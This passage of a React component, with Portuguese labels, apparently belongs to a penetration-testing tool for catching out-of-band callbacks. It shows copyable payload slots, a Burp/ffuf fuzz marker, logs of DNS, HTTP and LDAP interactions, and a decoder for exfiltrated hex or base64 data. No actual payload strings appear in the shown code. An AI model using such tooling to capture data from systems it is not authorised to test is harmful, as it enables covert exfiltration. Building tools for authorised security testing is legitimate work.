                        className="px-2 py-0.5 rounded bg-[#202030] hover:bg-[#28283c] text-zinc-200 border border-[#2e2e44] text-[10px] font-mono font-bold flex items-center gap-1 cursor-pointer transition-colors"
                      >
                        {copiedKey === `cmd-${selectedCategory}-${idx}` ? (
                          <>
                            <Check className="w-3 h-3 text-emerald-400" />
                            <span className="text-emerald-400">Copiado!</span>
                          </>
                        ) : (
                          <>
                            <Copy className="w-3 h-3" />
                            <span>Copiar</span>
                          </>
                        )}
                      </button>
                    </div>
                  </div>

                  <pre className="bg-[#0b0b10] border border-[#1e1e28] rounded-lg p-2.5 text-[11px] font-mono text-cyan-300 leading-relaxed overflow-x-auto select-all">
                    {item.command}
                  </pre>
                  <p className="text-[10px] text-zinc-400 italic">
                    {item.explanation}
                  </p>
                </div>
              ))}
            </div>

            {/* Quick Helper for Burp Intruder / ffuf */}
            <div className="p-3 rounded-xl bg-[#111116] border border-[#1e1e28] flex items-center justify-between gap-3 text-xs font-mono">
              <div className="flex items-center gap-2 text-zinc-400">
                <Info className="w-4 h-4 text-cyan-400 shrink-0" />
                <span>Variável Burp/ffuf: <code>http://§{tokenPrefix}§.{activeDomain}</code></span>
              </div>
              <button
                type="button"
                onClick={() => copyToClipboard(`http://§FUZZ§.${activeDomain}`, 'burp-marker')}
                className="px-2 py-1 rounded bg-[#1c1c28] hover:bg-[#252535] text-cyan-300 border border-cyan-500/30 text-[10px] font-bold cursor-pointer transition-all"
              >
                {copiedKey === 'burp-marker' ? 'Copiado!' : 'Copiar §FUZZ§ Marker'}
              </button>
            </div>
          </div>
        </div>

        {/* Right Column: Logs of External Requests Triggered */}
        <div className="lg:col-span-5 space-y-4">
          
          {/* Interaction Logs Container */}
          <div className="bg-[#121218] border border-[#22222f] rounded-2xl p-5 space-y-3.5">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2">
              <div className="flex items-center gap-2">
                <span className={`w-2.5 h-2.5 rounded-full ${isCapturing ? 'bg-emerald-400 animate-ping' : 'bg-amber-400'}`} />
                <h3 className="text-xs font-mono font-bold text-zinc-200 uppercase tracking-wider">
                  Log de Requisições Externas ({filteredInteractions.length})
                </h3>
              </div>

              {/* Actions: Export & Clear */}
              <div className="flex items-center gap-1.5 self-start sm:self-auto">
                <button
                  type="button"
                  onClick={exportLogsAsJson}
                  className="px-2 py-1 rounded bg-[#181824] hover:bg-[#222232] text-zinc-300 border border-[#262638] text-[10px] font-mono flex items-center gap-1 cursor-pointer transition-all"
                  title="Exportar JSON"
                >
                  <Download className="w-3 h-3 text-cyan-400" />
                  <span>JSON</span>
                </button>
                <button
                  type="button"
                  onClick={exportLogsAsCsv}
                  className="px-2 py-1 rounded bg-[#181824] hover:bg-[#222232] text-zinc-300 border border-[#262638] text-[10px] font-mono flex items-center gap-1 cursor-pointer transition-all"
                  title="Exportar CSV"
                >
                  <Download className="w-3 h-3 text-emerald-400" />
                  <span>CSV</span>
                </button>
                <button
                  type="button"
                  onClick={() => setInteractions([])}
                  className="p-1 rounded bg-[#181824] hover:bg-rose-950/40 text-zinc-400 hover:text-rose-400 border border-[#262638] cursor-pointer transition-all"
                  title="Limpar todos os logs"
                >
                  <Trash2 className="w-3.5 h-3.5" />
                </button>
              </div>
            </div>

            {/* Filter Pills & Search */}
            <div className="space-y-2 pt-1">
              <div className="flex items-center gap-1 overflow-x-auto pb-1 text-[10px] font-mono scrollbar-none">
                {(['ALL', 'DNS', 'HTTP', 'HTTPS', 'LDAP'] as const).map(p => (
                  <button
                    key={p}
                    type="button"
                    onClick={() => setProtocolFilter(p)}
                    className={`px-2 py-0.5 rounded-lg font-bold uppercase transition-all cursor-pointer ${
                      protocolFilter === p 
                        ? 'bg-cyan-500 text-black' 
                        : 'bg-[#181824] text-zinc-400 hover:text-white'
                    }`}
                  >
                    {p}
                  </button>
                ))}
              </div>

              <div className="relative">
                <Search className="w-3.5 h-3.5 text-zinc-500 absolute left-2.5 top-1/2 -translate-y-1/2" />
                <input
                  type="text"
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                  placeholder="Filtrar por IP, hostname ou exfiltração..."
                  className="w-full bg-[#161622] border border-[#262638] rounded-xl pl-8 pr-3 py-1.5 text-xs text-white font-mono focus:outline-none focus:border-cyan-500"
                />
              </div>
            </div>

            {/* Simulation Triggers Bar */}
            <div className="p-2.5 rounded-xl bg-[#161622] border border-[#232336] flex items-center justify-between gap-2 text-[10px] font-mono">
              <span className="text-zinc-400 font-bold">Simular Requisição:</span>
              <div className="flex items-center gap-1">
                <button
                  type="button"
                  onClick={() => triggerSimulation('DNS')}
                  className="px-2 py-0.5 rounded bg-cyan-950/60 hover:bg-cyan-900/80 text-cyan-300 border border-cyan-500/30 cursor-pointer font-bold transition-colors"
                >
                  +DNS (Port 53)
                </button>
                <button
                  type="button"
                  onClick={() => triggerSimulation('HTTP_GET')}
                  className="px-2 py-0.5 rounded bg-emerald-950/60 hover:bg-emerald-900/80 text-emerald-300 border border-emerald-500/30 cursor-pointer font-bold transition-colors"
                >
                  +GET
                </button>
                <button
                  type="button"
                  onClick={() => triggerSimulation('HTTP_POST')}
                  className="px-2 py-0.5 rounded bg-green-950/60 hover:bg-green-900/80 text-green-300 border border-green-500/30 cursor-pointer font-bold transition-colors"
                >
                  +POST
                </button>
                <button
                  type="button"
                  onClick={() => triggerSimulation('LDAP')}
                  className="px-2 py-0.5 rounded bg-purple-950/60 hover:bg-purple-900/80 text-purple-300 border border-purple-500/30 cursor-pointer font-bold transition-colors"
                >
                  +LDAP
                </button>
              </div>
            </div>

            {/* List of Captured External Requests */}
            <div className="space-y-2 max-h-[350px] overflow-y-auto pr-1">
              {filteredInteractions.length === 0 ? (
                <div className="p-6 text-center text-xs font-mono text-zinc-500 bg-[#0e0e14] rounded-xl border border-[#1f1f2d]">
                  Nenhuma interação capturada com os filtros atuais.
                </div>
              ) : (
                filteredInteractions.map(item => (
                  <div
                    key={item.id}
                    className="bg-[#161622] border border-[#232336] rounded-xl p-3 space-y-2 text-xs font-mono hover:border-[#303048] transition-all"
                  >
                    <div className="flex items-center justify-between">
                      <div className="flex items-center gap-1.5">
                        <span className={`px-2 py-0.5 rounded text-[10px] font-bold border ${
                          item.protocol === 'DNS' ? 'bg-cyan-500/20 text-cyan-300 border-cyan-500/40' :
                          item.protocol === 'LDAP' ? 'bg-purple-500/20 text-purple-300 border-purple-500/40' :
                          item.protocol === 'HTTPS' ? 'bg-green-500/20 text-green-300 border-green-500/40' :
                          'bg-emerald-500/20 text-emerald-300 border-emerald-500/40'
                        }`}>
                          {item.protocol} {item.httpMethod ? `[${item.httpMethod}]` : ''}
                        </span>
                        {item.correlatedTag && (
                          <span className="text-[10px] px-1.5 py-0.2 rounded bg-zinc-800 text-zinc-300 border border-zinc-700">
                            tag:{item.correlatedTag}
                          </span>
                        )}
                      </div>
                      <span className="text-[10px] text-zinc-400">{item.timestamp}</span>
                    </div>

                    <div className="text-white font-bold text-[11px] truncate bg-[#0b0b10] px-2 py-1 rounded border border-[#1f1f2e]">
                      {item.subdomainOrPath}
                    </div>

                    <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-1 text-[10px] text-zinc-400">
                      <div>
                        Origem: <span className="text-zinc-200">{item.sourceIp}</span>
                        {item.geoEstimate && <span className="text-zinc-500 ml-1">({item.geoEstimate})</span>}
                      </div>

                      {/* Interactive Inspect & Copy Buttons */}
                      <div className="flex items-center gap-1.5 shrink-0 self-end sm:self-auto">
                        <button
                          type="button"
                          onClick={() => setSelectedInteraction(item)}
                          className="px-2 py-0.5 rounded bg-cyan-950/60 hover:bg-cyan-900/80 text-cyan-300 border border-cyan-500/30 flex items-center gap-1 cursor-pointer transition-colors"
                          title="Inspecionar requisição completa"
                        >
                          <Eye className="w-3 h-3" />
                          <span>Inspecionar</span>
                        </button>
                        <button
                          type="button"
                          onClick={() => copyMarkdownEvidence(item)}
                          className="px-2 py-0.5 rounded bg-[#202030] hover:bg-[#28283c] text-zinc-300 border border-[#2e2e44] flex items-center gap-1 cursor-pointer transition-colors"
                          title="Copiar evidência em Markdown para relatório"
                        >
                          {copiedKey === `md-${item.id}` ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                          <span>Evidência</span>
                        </button>
                      </div>
                    </div>

                    {item.decodedData && (
                      <div className="pt-1 border-t border-[#1e1e2c] text-[10px] text-emerald-400 font-bold flex items-center gap-1">
                        <CheckCircle2 className="w-3 h-3 shrink-0" />
                        <span className="truncate">Exfiltração: {item.decodedData}</span>
                      </div>
                    )}
                  </div>
                ))
              )}
            </div>
          </div>

          {/* Workbench: Exfiltrated Data Decoder */}
          <div className="bg-[#121218] border border-[#22222f] rounded-2xl p-5 space-y-3">
            <h3 className="text-xs font-mono font-bold text-zinc-200 uppercase tracking-wider flex items-center gap-2">
              <Binary className="w-4 h-4 text-cyan-400" />
              <span>Decodificador de Dados Exfiltrados (OOB Data Workbench)</span>
            </h3>

            {/* Mode selection */}
            <div className="flex items-center gap-1.5 text-xs font-mono">
              <button
                type="button"
                onClick={() => setDecoderMode('hex-dns')}
                className={`px-2.5 py-1 rounded-lg transition-all cursor-pointer ${
                  decoderMode === 'hex-dns' ? 'bg-cyan-500 text-black font-bold' : 'bg-[#181824] text-zinc-400 hover:text-white'
                }`}
              >
                Hex Subdomain
              </button>
              <button
                type="button"
                onClick={() => setDecoderMode('base64')}
                className={`px-2.5 py-1 rounded-lg transition-all cursor-pointer ${
                  decoderMode === 'base64' ? 'bg-cyan-500 text-black font-bold' : 'bg-[#181824] text-zinc-400 hover:text-white'
                }`}
              >
                Base64 / URL Safe
              </button>
              <button
                type="button"
                onClick={() => setDecoderMode('url')}
                className={`px-2.5 py-1 rounded-lg transition-all cursor-pointer ${
                  decoderMode === 'url' ? 'bg-cyan-500 text-black font-bold' : 'bg-[#181824] text-zinc-400 hover:text-white'
                }`}
              >
                URL Decoded
              </button>
            </div>

            <div className="space-y-1">
              <label className="text-[11px] font-mono text-zinc-400">Texto / Subdomínio Exfiltrado:</label>
              <input
                type="text"
                value={decoderInput}
                onChange={(e) => setDecoderInput(e.target.value)}
                placeholder="Cole o hex (ex: 726f6f74) ou base64 exfiltrado..."
                className="w-full bg-[#161622] border border-[#262638] rounded-xl px-3 py-1.5 text-xs text-white font-mono focus:outline-none focus:border-cyan-500"
              />
            </div>

            <div className="space-y-1 pt-1">
              <div className="flex items-center justify-between text-[11px] font-mono text-zinc-400">
                <span>Resultado Decodificado:</span>
                {decodedResult && (
                  <button
                    type="button"
                    onClick={() => copyToClipboard(decodedResult, 'decoded-out')}
                    className="text-cyan-400 hover:underline flex items-center gap-1 cursor-pointer"
                  >
                    {copiedKey === 'decoded-out' ? <Check className="w-3 h-3" /> : <Copy className="w-3 h-3" />}
                    <span>Copiar</span>
                  </button>
                )}
              </div>
              <pre className="bg-[#0b0b10] border border-[#1e1e28] rounded-xl p-3 text-xs font-mono text-emerald-400 leading-relaxed break-all select-all max-h-[100px] overflow-y-auto">
                {decodedResult || '(Vazio)'}
              </pre>
            </div>
          </div>
        </div>
      </div>

      {/* Modal / Inspector for Detailed Request Logs */}
      {selectedInteraction && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm animate-in fade-in">
          <div className="bg-[#121218] border border-[#2a2a3e] rounded-2xl w-full max-w-2xl max-h-[90vh] flex flex-col shadow-2xl overflow-hidden">
            {/* Modal Header */}
            <div className="p-4 border-b border-[#222234] flex items-center justify-between bg-[#151520]">
              <div className="flex items-center gap-2">
                <span className={`px-2.5 py-0.5 rounded text-xs font-mono font-bold border ${
                  selectedInteraction.protocol === 'DNS' ? 'bg-cyan-500/20 text-cyan-300 border-cyan-500/40' :
                  selectedInteraction.protocol === 'LDAP' ? 'bg-purple-500/20 text-purple-300 border-purple-500/40' :
                  'bg-emerald-500/20 text-emerald-300 border-emerald-500/40'
                }`}>
                  {selectedInteraction.protocol}
                </span>
                <h3 className="text-sm font-bold text-white font-mono">
                  Detalhes da Requisição [{selectedInteraction.id}]
                </h3>
              </div>
              <button
                type="button"
                onClick={() => setSelectedInteraction(null)}
                className="p-1 rounded-lg text-zinc-400 hover:text-white hover:bg-[#20202e] transition-colors cursor-pointer"
              >
                <X className="w-4 h-4" />
              </button>
            </div>

            {/* Modal Content */}
            <div className="p-5 space-y-4 overflow-y-auto text-xs font-mono">
              <div className="grid grid-cols-2 gap-3 bg-[#161622] p-3 rounded-xl border border-[#232336]">
                <div>
                  <span className="text-zinc-500 block text-[10px]">Data & Hora UTC:</span>
                  <span className="text-zinc-200">{selectedInteraction.timestamp}</span>
                </div>
                <div>
                  <span className="text-zinc-500 block text-[10px]">IP de Origem:</span>
                  <span className="text-cyan-300 font-bold">{selectedInteraction.sourceIp}</span>
                </div>
                <div>
                  <span className="text-zinc-500 block text-[10px]">Reverse DNS:</span>
                  <span className="text-zinc-300">{selectedInteraction.sourceReverseDns || 'N/A'}</span>
                </div>
                <div>
                  <span className="text-zinc-500 block text-[10px]">Localização Estimada:</span>
                  <span className="text-zinc-300">{selectedInteraction.geoEstimate || 'N/A'}</span>
                </div>
              </div>

              <div>
                <label className="text-zinc-400 font-bold block mb-1">Host / Subdomínio Requisitado:</label>
                <pre className="bg-[#0b0b10] border border-[#1f1f2e] p-2.5 rounded-lg text-cyan-300 break-all select-all">
                  {selectedInteraction.subdomainOrPath}
                </pre>
              </div>

              {selectedInteraction.headers && (
                <div>
                  <label className="text-zinc-400 font-bold block mb-1">Cabeçalhos HTTP Recebidos:</label>
                  <pre className="bg-[#0b0b10] border border-[#1f1f2e] p-2.5 rounded-lg text-zinc-300 leading-relaxed overflow-x-auto">
                    {Object.entries(selectedInteraction.headers).map(([k, v]) => `${k}: ${v}`).join('\n')}
                  </pre>
                </div>
              )}

              {selectedInteraction.queryParameters && Object.keys(selectedInteraction.queryParameters).length > 0 && (
                <div>
                  <label className="text-zinc-400 font-bold block mb-1">Parâmetros de Consulta (Query String):</label>
                  <pre className="bg-[#0b0b10] border border-[#1f1f2e] p-2.5 rounded-lg text-amber-300 leading-relaxed overflow-x-auto">
                    {JSON.stringify(selectedInteraction.queryParameters, null, 2)}
                  </pre>
                </div>
              )}

              {selectedInteraction.requestBody && (
                <div>
                  <label className="text-zinc-400 font-bold block mb-1">Corpo da Requisição (POST Body):</label>
                  <pre className="bg-[#0b0b10] border border-[#1f1f2e] p-2.5 rounded-lg text-emerald-300 leading-relaxed overflow-x-auto">
                    {selectedInteraction.requestBody}
                  </pre>
                </div>
              )}

              {selectedInteraction.decodedData && (
                <div className="p-3 rounded-xl bg-emerald-950/20 border border-emerald-500/30 text-emerald-300">
                  <span className="text-[10px] font-bold uppercase tracking-wider block">Dado Exfiltrado Decodificado:</span>
                  <div className="font-bold text-sm mt-0.5">{selectedInteraction.decodedData}</div>
                </div>
              )}
            </div>

            {/* Modal Footer */}
            <div className="p-4 border-t border-[#222234] bg-[#151520] flex items-center justify-between gap-2">
              <button
                type="button"
                onClick={() => copyMarkdownEvidence(selectedInteraction)}
                className="px-3 py-1.5 rounded-xl bg-[#20202e] hover:bg-[#28283c] text-zinc-200 border border-[#2e2e42] text-xs font-mono font-bold flex items-center gap-1.5 cursor-pointer transition-colors"
              >
                {copiedKey === `md-${selectedInteraction.id}` ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                <span>Copiar Relatório Markdown</span>
              </button>

              <button
                type="button"
                onClick={() => setSelectedInteraction(null)}
                className="px-4 py-1.5 rounded-xl bg-cyan-600 hover:bg-cyan-500 text-white font-mono text-xs font-bold cursor-pointer transition-colors"
              >
                Fechar
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};
